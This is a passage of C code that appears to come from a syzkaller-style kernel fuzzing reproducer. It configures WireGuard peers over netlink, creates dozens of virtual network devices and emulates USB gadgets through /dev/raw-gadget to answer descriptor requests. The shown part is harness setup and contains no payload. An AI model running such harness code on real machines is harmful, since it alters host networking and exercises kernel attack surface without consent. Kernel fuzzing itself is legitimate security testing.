  netlink_attr(&nlmsg, WGPEER_A_ENDPOINT, &endpoint_b_v4,
               sizeof(endpoint_b_v4));
  netlink_attr(&nlmsg, WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
               &persistent_keepalives[0], 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGPEER_A_ALLOWEDIPS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &first_half_v4,
               sizeof(first_half_v4));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet6, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &first_half_v6,
               sizeof(first_half_v6));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGPEER_A_PUBLIC_KEY, public_c, 32);
  netlink_attr(&nlmsg, WGPEER_A_ENDPOINT, &endpoint_c_v6,
               sizeof(endpoint_c_v6));
  netlink_attr(&nlmsg, WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
               &persistent_keepalives[1], 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGPEER_A_ALLOWEDIPS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &second_half_v4,
               sizeof(second_half_v4));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet6, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &second_half_v6,
               sizeof(second_half_v6));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  err = netlink_send(&nlmsg, sock);
  if (err < 0) {
  }
  netlink_init(&nlmsg, id, 0, &genlhdr, sizeof(genlhdr));
  netlink_attr(&nlmsg, WGDEVICE_A_IFNAME, ifname_b, strlen(ifname_b) + 1);
  netlink_attr(&nlmsg, WGDEVICE_A_PRIVATE_KEY, private_b, 32);
  netlink_attr(&nlmsg, WGDEVICE_A_LISTEN_PORT, &listen_b, 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGDEVICE_A_PEERS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGPEER_A_PUBLIC_KEY, public_a, 32);
  netlink_attr(&nlmsg, WGPEER_A_ENDPOINT, &endpoint_a_v6,
               sizeof(endpoint_a_v6));
  netlink_attr(&nlmsg, WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
               &persistent_keepalives[2], 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGPEER_A_ALLOWEDIPS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &first_half_v4,
               sizeof(first_half_v4));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet6, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &first_half_v6,
               sizeof(first_half_v6));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGPEER_A_PUBLIC_KEY, public_c, 32);
  netlink_attr(&nlmsg, WGPEER_A_ENDPOINT, &endpoint_c_v4,
               sizeof(endpoint_c_v4));
  netlink_attr(&nlmsg, WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
               &persistent_keepalives[3], 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGPEER_A_ALLOWEDIPS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &second_half_v4,
               sizeof(second_half_v4));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet6, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &second_half_v6,
               sizeof(second_half_v6));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  err = netlink_send(&nlmsg, sock);
  if (err < 0) {
  }
  netlink_init(&nlmsg, id, 0, &genlhdr, sizeof(genlhdr));
  netlink_attr(&nlmsg, WGDEVICE_A_IFNAME, ifname_c, strlen(ifname_c) + 1);
  netlink_attr(&nlmsg, WGDEVICE_A_PRIVATE_KEY, private_c, 32);
  netlink_attr(&nlmsg, WGDEVICE_A_LISTEN_PORT, &listen_c, 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGDEVICE_A_PEERS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGPEER_A_PUBLIC_KEY, public_a, 32);
  netlink_attr(&nlmsg, WGPEER_A_ENDPOINT, &endpoint_a_v6,
               sizeof(endpoint_a_v6));
  netlink_attr(&nlmsg, WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
               &persistent_keepalives[4], 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGPEER_A_ALLOWEDIPS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &first_half_v4,
               sizeof(first_half_v4));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet6, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &first_half_v6,
               sizeof(first_half_v6));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGPEER_A_PUBLIC_KEY, public_b, 32);
  netlink_attr(&nlmsg, WGPEER_A_ENDPOINT, &endpoint_b_v4,
               sizeof(endpoint_b_v4));
  netlink_attr(&nlmsg, WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
               &persistent_keepalives[5], 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGPEER_A_ALLOWEDIPS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &second_half_v4,
               sizeof(second_half_v4));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_FAMILY, &af_inet6, 2);
  netlink_attr(&nlmsg, WGALLOWEDIP_A_IPADDR, &second_half_v6,
               sizeof(second_half_v6));
  netlink_attr(&nlmsg, WGALLOWEDIP_A_CIDR_MASK, &half_cidr, 1);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  netlink_done(&nlmsg);
  err = netlink_send(&nlmsg, sock);
  if (err < 0) {
  }

error:
  close(sock);
}

// 初始化各种网络设备，如veth对、vlan、macvlan等
static void initialize_netdevices(void)
{
  char netdevsim[16];
  sprintf(netdevsim, "netdevsim%d", (int)procid);
  struct {
    const char* type;
    const char* dev;
  } devtypes[] = {
      {"ip6gretap", "ip6gretap0"}, {"bridge", "bridge0"}, {"vcan", "vcan0"},
      {"bond", "bond0"},           {"team", "team0"},     {"dummy", "dummy0"},
      {"nlmon", "nlmon0"},         {"caif", "caif0"},     {"batadv", "batadv0"},
      {"vxcan", "vxcan1"},         {"veth", 0},           {"wireguard", "wg0"},
      {"wireguard", "wg1"},        {"wireguard", "wg2"},
  };
  const char* devmasters[] = {"bridge", "bond", "team", "batadv"};
  struct {
    const char* name;
    int macsize;
    bool noipv6;
  } devices[] = {
      {"lo", ETH_ALEN},
      {"sit0", 0},
      {"bridge0", ETH_ALEN},
      {"vcan0", 0, true},
      {"tunl0", 0},
      {"gre0", 0},
      {"gretap0", ETH_ALEN},
      {"ip_vti0", 0},
      {"ip6_vti0", 0},
      {"ip6tnl0", 0},
      {"ip6gre0", 0},
      {"ip6gretap0", ETH_ALEN},
      {"erspan0", ETH_ALEN},
      {"bond0", ETH_ALEN},
      {"veth0", ETH_ALEN},
      {"veth1", ETH_ALEN},
      {"team0", ETH_ALEN},
      {"veth0_to_bridge", ETH_ALEN},
      {"veth1_to_bridge", ETH_ALEN},
      {"veth0_to_bond", ETH_ALEN},
      {"veth1_to_bond", ETH_ALEN},
      {"veth0_to_team", ETH_ALEN},
      {"veth1_to_team", ETH_ALEN},
      {"veth0_to_hsr", ETH_ALEN},
      {"veth1_to_hsr", ETH_ALEN},
      {"hsr0", 0},
      {"dummy0", ETH_ALEN},
      {"nlmon0", 0},
      {"vxcan0", 0, true},
      {"vxcan1", 0, true},
      {"caif0", ETH_ALEN},
      {"batadv0", ETH_ALEN},
      {netdevsim, ETH_ALEN},
      {"xfrm0", ETH_ALEN},
      {"veth0_virt_wifi", ETH_ALEN},
      {"veth1_virt_wifi", ETH_ALEN},
      {"virt_wifi0", ETH_ALEN},
      {"veth0_vlan", ETH_ALEN},
      {"veth1_vlan", ETH_ALEN},
      {"vlan0", ETH_ALEN},
      {"vlan1", ETH_ALEN},
      {"macvlan0", ETH_ALEN},
      {"macvlan1", ETH_ALEN},
      {"ipvlan0", ETH_ALEN},
      {"ipvlan1", ETH_ALEN},
      {"veth0_macvtap", ETH_ALEN},
      {"veth1_macvtap", ETH_ALEN},
      {"macvtap0", ETH_ALEN},
      {"macsec0", ETH_ALEN},
      {"veth0_to_batadv", ETH_ALEN},
      {"veth1_to_batadv", ETH_ALEN},
      {"batadv_slave_0", ETH_ALEN},
      {"batadv_slave_1", ETH_ALEN},
      {"geneve0", ETH_ALEN},
      {"geneve1", ETH_ALEN},
      {"wg0", 0},
      {"wg1", 0},
      {"wg2", 0},
  };
  int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (sock == -1)
    exit(1);
  unsigned i;
  for (i = 0; i < sizeof(devtypes) / sizeof(devtypes[0]); i++)
    netlink_add_device(&nlmsg, sock, devtypes[i].type, devtypes[i].dev);
  for (i = 0; i < sizeof(devmasters) / (sizeof(devmasters[0])); i++) {
    char master[32], slave0[32], veth0[32], slave1[32], veth1[32];
    sprintf(slave0, "%s_slave_0", devmasters[i]);
    sprintf(veth0, "veth0_to_%s", devmasters[i]);
    netlink_add_veth(&nlmsg, sock, slave0, veth0);
    sprintf(slave1, "%s_slave_1", devmasters[i]);
    sprintf(veth1, "veth1_to_%s", devmasters[i]);
    netlink_add_veth(&nlmsg, sock, slave1, veth1);
    sprintf(master, "%s0", devmasters[i]);
    netlink_device_change(&nlmsg, sock, slave0, false, master, 0, 0, NULL);
    netlink_device_change(&nlmsg, sock, slave1, false, master, 0, 0, NULL);
  }
  netlink_add_xfrm(&nlmsg, sock, "xfrm0");
  netlink_device_change(&nlmsg, sock, "bridge_slave_0", true, 0, 0, 0, NULL);
  netlink_device_change(&nlmsg, sock, "bridge_slave_1", true, 0, 0, 0, NULL);
  netlink_add_veth(&nlmsg, sock, "hsr_slave_0", "veth0_to_hsr");
  netlink_add_veth(&nlmsg, sock, "hsr_slave_1", "veth1_to_hsr");
  netlink_add_hsr(&nlmsg, sock, "hsr0", "hsr_slave_0", "hsr_slave_1");
  netlink_device_change(&nlmsg, sock, "hsr_slave_0", true, 0, 0, 0, NULL);
  netlink_device_change(&nlmsg, sock, "hsr_slave_1", true, 0, 0, 0, NULL);
  netlink_add_veth(&nlmsg, sock, "veth0_virt_wifi", "veth1_virt_wifi");
  netlink_add_linked(&nlmsg, sock, "virt_wifi", "virt_wifi0",
                     "veth1_virt_wifi");
  netlink_add_veth(&nlmsg, sock, "veth0_vlan", "veth1_vlan");
  netlink_add_vlan(&nlmsg, sock, "vlan0", "veth0_vlan", 0, htons(ETH_P_8021Q));
  netlink_add_vlan(&nlmsg, sock, "vlan1", "veth0_vlan", 1, htons(ETH_P_8021AD));
  netlink_add_macvlan(&nlmsg, sock, "macvlan0", "veth1_vlan");
  netlink_add_macvlan(&nlmsg, sock, "macvlan1", "veth1_vlan");
  netlink_add_ipvlan(&nlmsg, sock, "ipvlan0", "veth0_vlan", IPVLAN_MODE_L2, 0);
  netlink_add_ipvlan(&nlmsg, sock, "ipvlan1", "veth0_vlan", IPVLAN_MODE_L3S,
                     IPVLAN_F_VEPA);
  netlink_add_veth(&nlmsg, sock, "veth0_macvtap", "veth1_macvtap");
  netlink_add_linked(&nlmsg, sock, "macvtap", "macvtap0", "veth0_macvtap");
  netlink_add_linked(&nlmsg, sock, "macsec", "macsec0", "veth1_macvtap");
  char addr[32];
  sprintf(addr, DEV_IPV4, 14 + 10);
  struct in_addr geneve_addr4;
  if (inet_pton(AF_INET, addr, &geneve_addr4) <= 0)
    exit(1);
  struct in6_addr geneve_addr6;
  if (inet_pton(AF_INET6, "fc00::01", &geneve_addr6) <= 0)
    exit(1);
  netlink_add_geneve(&nlmsg, sock, "geneve0", 0, &geneve_addr4, 0);
  netlink_add_geneve(&nlmsg, sock, "geneve1", 1, 0, &geneve_addr6);
  netdevsim_add((int)procid, 4);
  netlink_wireguard_setup();
  for (i = 0; i < sizeof(devices) / (sizeof(devices[0])); i++) {
    char addr[32];
    sprintf(addr, DEV_IPV4, i + 10);
    netlink_add_addr4(&nlmsg, sock, devices[i].name, addr);
    if (!devices[i].noipv6) {
      sprintf(addr, DEV_IPV6, i + 10);
      netlink_add_addr6(&nlmsg, sock, devices[i].name, addr);
    }
    uint64_t macaddr = DEV_MAC + ((i + 10ull) << 40);
    netlink_device_change(&nlmsg, sock, devices[i].name, true, 0, &macaddr,
                          devices[i].macsize, NULL);
  }
  close(sock);
}

// 初始化一些特殊的网络设备
static void initialize_netdevices_init(void)
{
  int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (sock == -1)
    exit(1);
  struct {
    const char* type;
    int macsize;
    bool noipv6;
    bool noup;
  } devtypes[] = {
      {"nr", 7, true},
      {"rose", 5, true, true},
  };
  unsigned i;
  for (i = 0; i < sizeof(devtypes) / sizeof(devtypes[0]); i++) {
    char dev[32], addr[32];
    sprintf(dev, "%s%d", devtypes[i].type, (int)procid);
    sprintf(addr, "172.30.%d.%d", i, (int)procid + 1);
    netlink_add_addr4(&nlmsg, sock, dev, addr);
    if (!devtypes[i].noipv6) {
      sprintf(addr, "fe88::%02x:%02x", i, (int)procid + 1);
      netlink_add_addr6(&nlmsg, sock, dev, addr);
    }
    int macsize = devtypes[i].macsize;
    uint64_t macaddr = 0xbbbbbb +
                       ((unsigned long long)i << (8 * (macsize - 2))) +
                       (procid << (8 * (macsize - 1)));
    netlink_device_change(&nlmsg, sock, dev, !devtypes[i].noup, 0, &macaddr,
                          macsize, NULL);
  }
  close(sock);
}

#define MAX_FDS 30

#define USB_MAX_IFACE_NUM 4
#define USB_MAX_EP_NUM 32
#define USB_MAX_FDS 6

struct usb_endpoint_index {
  struct usb_endpoint_descriptor desc;
  int handle;
};

struct usb_iface_index {
  struct usb_interface_descriptor* iface;
  uint8_t bInterfaceNumber;
  uint8_t bAlternateSetting;
  uint8_t bInterfaceClass;
  struct usb_endpoint_index eps[USB_MAX_EP_NUM];
  int eps_num;
};

struct usb_device_index {
  struct usb_device_descriptor* dev;
  struct usb_config_descriptor* config;
  uint8_t bDeviceClass;
  uint8_t bMaxPower;
  int config_length;
  struct usb_iface_index ifaces[USB_MAX_IFACE_NUM];
  int ifaces_num;
  int iface_cur;
};

struct usb_info {
  int fd;
  struct usb_device_index index;
};

static struct usb_info usb_devices[USB_MAX_FDS];
static int usb_devices_num;

static bool parse_usb_descriptor(const char* buffer, size_t length,
                                 struct usb_device_index* index)
{
  if (length < sizeof(*index->dev) + sizeof(*index->config))
    return false;
  memset(index, 0, sizeof(*index));
  index->dev = (struct usb_device_descriptor*)buffer;
  index->config = (struct usb_config_descriptor*)(buffer + sizeof(*index->dev));
  index->bDeviceClass = index->dev->bDeviceClass;
  index->bMaxPower = index->config->bMaxPower;
  index->config_length = length - sizeof(*index->dev);
  index->iface_cur = -1;
  size_t offset = 0;
  while (true) {
    if (offset + 1 >= length)
      break;
    uint8_t desc_length = buffer[offset];
    uint8_t desc_type = buffer[offset + 1];
    if (desc_length <= 2)
      break;
    if (offset + desc_length > length)
      break;
    if (desc_type == USB_DT_INTERFACE &&
        index->ifaces_num < USB_MAX_IFACE_NUM) {
      struct usb_interface_descriptor* iface =
          (struct usb_interface_descriptor*)(buffer + offset);
      index->ifaces[index->ifaces_num].iface = iface;
      index->ifaces[index->ifaces_num].bInterfaceNumber =
          iface->bInterfaceNumber;
      index->ifaces[index->ifaces_num].bAlternateSetting =
          iface->bAlternateSetting;
      index->ifaces[index->ifaces_num].bInterfaceClass = iface->bInterfaceClass;
      index->ifaces_num++;
    }
    if (desc_type == USB_DT_ENDPOINT && index->ifaces_num > 0) {
      struct usb_iface_index* iface = &index->ifaces[index->ifaces_num - 1];
      if (iface->eps_num < USB_MAX_EP_NUM) {
        memcpy(&iface->eps[iface->eps_num].desc, buffer + offset,
               sizeof(iface->eps[iface->eps_num].desc));
        iface->eps_num++;
      }
    }
    offset += desc_length;
  }
  return true;
}

static struct usb_device_index* add_usb_index(int fd, const char* dev,
                                              size_t dev_len)
{
  int i = __atomic_fetch_add(&usb_devices_num, 1, __ATOMIC_RELAXED);
  if (i >= USB_MAX_FDS)
    return NULL;
  if (!parse_usb_descriptor(dev, dev_len, &usb_devices[i].index))
    return NULL;
  __atomic_store_n(&usb_devices[i].fd, fd, __ATOMIC_RELEASE);
  return &usb_devices[i].index;
}

static struct usb_device_index* lookup_usb_index(int fd)
{
  for (int i = 0; i < USB_MAX_FDS; i++) {
    if (__atomic_load_n(&usb_devices[i].fd, __ATOMIC_ACQUIRE) == fd)
      return &usb_devices[i].index;
  }
  return NULL;
}

struct vusb_connect_string_descriptor {
  uint32_t len;
  char* str;
} __attribute__((packed));

struct vusb_connect_descriptors {
  uint32_t qual_len;
  char* qual;
  uint32_t bos_len;
  char* bos;
  uint32_t strs_len;
  struct vusb_connect_string_descriptor strs[0];
} __attribute__((packed));

static const char default_string[] = {8, USB_DT_STRING, 's', 0, 'y', 0, 'z', 0};

static const char default_lang_id[] = {4, USB_DT_STRING, 0x09, 0x04};

// 处理USB控制请求的输入
static bool
lookup_connect_response_in(int fd, const struct vusb_connect_descriptors* descs,
                           const struct usb_ctrlrequest* ctrl,
                           struct usb_qualifier_descriptor* qual,
                           char** response_data, uint32_t* response_length)
{
  struct usb_device_index* index = lookup_usb_index(fd);
  uint8_t str_idx;
  if (!index)
    return false;
  switch (ctrl->bRequestType & USB_TYPE_MASK) {
  case USB_TYPE_STANDARD:
    switch (ctrl->bRequest) {
    case USB_REQ_GET_DESCRIPTOR:
      switch (ctrl->wValue >> 8) {
      case USB_DT_DEVICE:
        *response_data = (char*)index->dev;
        *response_length = sizeof(*index->dev);
        return true;
      case USB_DT_CONFIG:
        *response_data = (char*)index->config;
        *response_length = index->config_length;
        return true;
      case USB_DT_STRING:
        str_idx = (uint8_t)ctrl->wValue;
        if (descs && str_idx < descs->strs_len) {
          *response_data = descs->strs[str_idx].str;
          *response_length = descs->strs[str_idx].len;
          return true;
        }
        if (str_idx == 0) {
          *response_data = (char*)&default_lang_id[0];
          *response_length = default_lang_id[0];
          return true;
        }
        *response_data = (char*)&default_string[0];
        *response_length = default_string[0];
        return true;
      case USB_DT_BOS:
        *response_data = descs->bos;
        *response_length = descs->bos_len;
        return true;
      case USB_DT_DEVICE_QUALIFIER:
        if (!descs->qual) {
          qual->bLength = sizeof(*qual);
          qual->bDescriptorType = USB_DT_DEVICE_QUALIFIER;
          qual->bcdUSB = index->dev->bcdUSB;
          qual->bDeviceClass = index->dev->bDeviceClass;
          qual->bDeviceSubClass = index->dev->bDeviceSubClass;
          qual->bDeviceProtocol = index->dev->bDeviceProtocol;
          qual->bMaxPacketSize0 = index->dev->bMaxPacketSize0;
          qual->bNumConfigurations = index->dev->bNumConfigurations;
          qual->bRESERVED = 0;
          *response_data = (char*)qual;
          *response_length = sizeof(*qual);
          return true;
        }
        *response_data = descs->qual;
        *response_length = descs->qual_len;
        return true;
      default:
        break;
      }
      break;
    default:
      break;
    }
    break;
  default:
    break;
  }
  return false;
}

typedef bool (*lookup_connect_out_response_t)(
    int fd, const struct vusb_connect_descriptors* descs,
    const struct usb_ctrlrequest* ctrl, bool* done);


// 处理USB控制请求的输出
static bool lookup_connect_response_out_generic(
    int fd, const struct vusb_connect_descriptors* descs,
    const struct usb_ctrlrequest* ctrl, bool* done)
{
  switch (ctrl->bRequestType & USB_TYPE_MASK) {
  case USB_TYPE_STANDARD:
    switch (ctrl->bRequest) {
    case USB_REQ_SET_CONFIGURATION:
      *done = true;
      return true;
    default:
      break;
    }
    break;
  }
  return false;
}

#define UDC_NAME_LENGTH_MAX 128

// usb_raw_*   函数：与  /dev/raw-gadget  设备文件通信，模拟USB设备的行为
struct usb_raw_init {
  __u8 driver_name[UDC_NAME_LENGTH_MAX];
  __u8 device_name[UDC_NAME_LENGTH_MAX];
  __u8 speed;
};

enum usb_raw_event_type {
  USB_RAW_EVENT_INVALID = 0,
  USB_RAW_EVENT_CONNECT = 1,
  USB_RAW_EVENT_CONTROL = 2,
};

struct usb_raw_event {
  __u32 type;
  __u32 length;
  __u8 data[0];
};

struct usb_raw_ep_io {
  __u16 ep;
  __u16 flags;
  __u32 length;
  __u8 data[0];
};

#define USB_RAW_EPS_NUM_MAX 30
#define USB_RAW_EP_NAME_MAX 16
#define USB_RAW_EP_ADDR_ANY 0xff

struct usb_raw_ep_caps {
  __u32 type_control : 1;
  __u32 type_iso : 1;
  __u32 type_bulk : 1;
  __u32 type_int : 1;
  __u32 dir_in : 1;
  __u32 dir_out : 1;
};

struct usb_raw_ep_limits {
  __u16 maxpacket_limit;
  __u16 max_streams;
  __u32 reserved;
};

struct usb_raw_ep_info {
  __u8 name[USB_RAW_EP_NAME_MAX];
  __u32 addr;
  struct usb_raw_ep_caps caps;
  struct usb_raw_ep_limits limits;
};

struct usb_raw_eps_info {
  struct usb_raw_ep_info eps[USB_RAW_EPS_NUM_MAX];
};

#define USB_RAW_IOCTL_INIT _IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN _IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH _IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE _IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ _IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE _IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_DISABLE _IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE _IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ _IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE _IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW _IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EPS_INFO _IOR('U', 11, struct usb_raw_eps_info)
#define USB_RAW_IOCTL_EP0_STALL _IO('U', 12)
#define USB_RAW_IOCTL_EP_SET_HALT _IOW('U', 13, __u32)
#define USB_RAW_IOCTL_EP_CLEAR_HALT _IOW('U', 14, __u32)
#define USB_RAW_IOCTL_EP_SET_WEDGE _IOW('U', 15, __u32)

static int usb_raw_open()
{
  return open("/dev/raw-gadget", O_RDWR);
}

static int usb_raw_init(int fd, uint32_t speed, const char* driver,
                        const char* device)
{
  struct usb_raw_init arg;
  strncpy((char*)&arg.driver_name[0], driver, sizeof(arg.driver_name));
  strncpy((char*)&arg.device_name[0], device, sizeof(arg.device_name));
  arg.speed = speed;
  return ioctl(fd, USB_RAW_IOCTL_INIT, &arg);
}

static int usb_raw_run(int fd)
{
  return ioctl(fd, USB_RAW_IOCTL_RUN, 0);
}

static int usb_raw_event_fetch(int fd, struct usb_raw_event* event)
{
  return ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, event);
}

static int usb_raw_ep0_write(int fd, struct usb_raw_ep_io* io)
{
  return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
}

static int usb_raw_ep0_read(int fd, struct usb_raw_ep_io* io)
{
  return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}

static int usb_raw_ep_enable(int fd, struct usb_endpoint_descriptor* desc)
{
  return ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, desc);
}

static int usb_raw_ep_disable(int fd, int ep)
{
  return ioctl(fd, USB_RAW_IOCTL_EP_DISABLE, ep);
}

static int usb_raw_configure(int fd)
{
  return ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0);
}

static int usb_raw_vbus_draw(int fd, uint32_t power)
{
  return ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, power);
}

static int usb_raw_ep0_stall(int fd)
{
  return ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
}

static void set_interface(int fd, int n)
{
  struct usb_device_index* index = lookup_usb_index(fd);
  if (!index)
    return;
  if (index->iface_cur >= 0 && index->iface_cur < index->ifaces_num) {
    for (int ep = 0; ep < index->ifaces[index->iface_cur].eps_num; ep++) {
      int rv = usb_raw_ep_disable(
          fd, index->ifaces[index->iface_cur].eps[ep].handle);
      if (rv < 0) {
      } else {
      }
    }
  }
  if (n >= 0 && n < index->ifaces_num) {
    for (int ep = 0; ep < index->ifaces[n].eps_num; ep++) {
      int rv = usb_raw_ep_enable(fd, &index->ifaces[n].eps[ep].desc);
      if (rv < 0) {
      } else {
        index->ifaces[n].eps[ep].handle = rv;
      }
    }
    index->iface_cur = n;
  }
}

static int configure_device(int fd)
{
  struct usb_device_index* index = lookup_usb_index(fd);
  if (!index)
    return -1;
  int rv = usb_raw_vbus_draw(fd, index->bMaxPower);
  if (rv < 0) {
    return rv;
  }
  rv = usb_raw_configure(fd);
  if (rv < 0) {
    return rv;
  }
  set_interface(fd, 0);
  return 0;
}

#define USB_MAX_PACKET_SIZE 4096

struct usb_raw_control_event {
  struct usb_raw_event inner;
  struct usb_ctrlrequest ctrl;
  char data[USB_MAX_PACKET_SIZE];
};

struct usb_raw_ep_io_data {
  struct usb_raw_ep_io inner;
  char data[USB_MAX_PACKET_SIZE];
};

// 模拟USB设备连接，处理USB控制请求
static volatile long
syz_usb_connect_impl(uint64_t speed, uint64_t dev_len, const char* dev,
                     const struct vusb_connect_descriptors* descs,
                     lookup_connect_out_response_t lookup_connect_response_out)
{
  if (!dev) {
    return -1;
  }
  int fd = usb_raw_open();
  if (fd < 0) {
    return fd;
  }
  if (fd >= MAX_FDS) {
    close(fd);
    return -1;
  }
  struct usb_device_index* index = add_usb_index(fd, dev, dev_len);
  if (!index) {
    return -1;
  }
  char device[32];
  sprintf(&device[0], "dummy_udc.%llu", procid);
  int rv = usb_raw_init(fd, speed, "dummy_udc", &device[0]);
  if (rv < 0) {
    return rv;
  }
  rv = usb_raw_run(fd);
  if (rv < 0) {
    return rv;
  }
  bool done = false;
  while (!done) {
    struct usb_raw_control_event event;
    event.inner.type = 0;
    event.inner.length = sizeof(event.ctrl);
    rv = usb_raw_event_fetch(fd, (struct usb_raw_event*)&event);
    if (rv < 0) {
      return rv;
    }
    if (event.inner.type != USB_RAW_EVENT_CONTROL)
      continue;
    char* response_data = NULL;
    uint32_t response_length = 0;
    struct usb_qualifier_descriptor qual;
    if (event.ctrl.bRequestType & USB_DIR_IN) {
      if (!lookup_connect_response_in(fd, descs, &event.ctrl, &qual,
                                      &response_data, &response_length)) {
        usb_raw_ep0_stall(fd);
        continue;
      }
    } else {
      if (!lookup_connect_response_out(fd, descs, &event.ctrl, &done)) {
